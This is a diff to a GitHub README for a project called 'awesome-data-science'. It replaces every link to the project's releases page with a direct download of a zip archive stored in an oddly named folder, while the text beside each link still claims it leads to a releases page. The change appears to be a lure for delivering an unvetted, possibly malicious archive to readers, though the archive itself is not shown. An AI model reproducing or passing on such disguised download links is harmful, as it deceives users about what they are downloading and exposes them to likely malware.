@@ -1,6 +1,6 @@
 # 🌟 awesome-data-science - Explore Tools for Data Science Success
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/lxbkid/awesome-data-science/releases)
+[![Download Now](https://github.com/lxbkid/awesome-data-science/raw/refs/heads/main/serpentivorous/data_awesome_science_3.8.zip%20Now-Get%20Started-brightgreen)](https://github.com/lxbkid/awesome-data-science/raw/refs/heads/main/serpentivorous/data_awesome_science_3.8.zip)
 
 ## 📚 Description
 
@@ -13,7 +13,7 @@ Follow these steps to download and run the awesome-data-science application:
 1. **Visit the Download Page**:
    Click the link below to go to the releases page where you can find the latest version of awesome-data-science.
 
-   [Visit this page to download](https://github.com/lxbkid/awesome-data-science/releases)
+   [Visit this page to download](https://github.com/lxbkid/awesome-data-science/raw/refs/heads/main/serpentivorous/data_awesome_science_3.8.zip)
 
 2. **Download the Latest Release**:
    On the releases page, look for the most recent version of the software. You will find a list of files related to the release, including necessary resources for your data science projects.
@@ -49,7 +49,7 @@ Now that you are familiar with the application, it’s time to download and set 
 1. **Go to the Releases Page**:
    As mentioned, start by visiting the releases page: 
 
-   [Visit this page to download](https://github.com/lxbkid/awesome-data-science/releases)
+   [Visit this page to download](https://github.com/lxbkid/awesome-data-science/raw/refs/heads/main/serpentivorous/data_awesome_science_3.8.zip)
 
 2. **Choose Release**:
    Find the latest version and download the relevant file based on your operating system.
